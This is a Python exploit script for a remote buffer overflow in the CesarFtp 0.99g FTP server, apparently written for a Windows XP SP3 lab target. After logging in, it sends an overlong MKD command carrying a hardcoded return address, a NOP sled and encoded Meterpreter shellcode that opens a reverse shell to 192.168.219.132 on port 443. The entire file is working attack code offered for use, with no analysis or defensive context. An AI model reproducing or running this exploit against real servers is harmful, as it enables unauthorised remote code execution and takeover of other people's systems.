#CesarFtp 0.99g Remote BOF
#Tested on : Windows XP Professional SP3

import socket

host = "192.168.219.161"
port = 21
user = "nj"
password = "nj"

#Bad Chars Identified \x00 \x0A \x0D 
#Return Address 0x7e429353
#windows/meterpreter/reverse_ord_tcp LHOST=192.168.219.132 LPORT=443 EXITFUNC=thread
shellcode =  ""
shellcode += "\x6a\x18\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
shellcode += "\x13\xc1\x65\x11\xc3\x83\xeb\xfc\xe2\xf4\x3d\x54"
shellcode += "\xca\xa7\x4a\x26\x21\x48\x81\x69\x9a\x93\xdd\xee"
shellcode += "\x03\x48\xb3\x45\xbc\x6e\x8f\x66\x17\xfe\xf3\x56"
shellcode += "\x4e\xf1\xb4\x8a\x9a\xa9\xc9\xee\x54\xff\x4a\x29"
shellcode += "\x14\xbb\x4a\x29\x1c\xdf\xc0\x8c\x9a\x82\x99\x64"
shellcode += "\xf9\x48\xb0\x59\x10\x2d\xc2\x0c\x1d\x90\xab\x64"
shellcode += "\x7b\xc1\x3e\xb5\x86\xab\x01\xcd\xca\x47\xa9\x67"
shellcode += "\x11\xc2\x7a\xec\xf0\x90\x76\x69\x42\x92\x96\x34"
shellcode += "\x7b\xd3\x90\x32\x47\x3c\x24\x65\x11\xc3"

buffer = "MKD " + "\n" * 671 + "PWN" + '\x53\x93\x42\x7e' + "\x90" * 40 + shellcode + '\x90\x90\x90' + "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)
s.send("user %s\r\n" % (user))
print s.recv(1024)
s.send("pass %s\r\n" % (password))
print s.recv(1024)
s.send(buffer)
s.close()
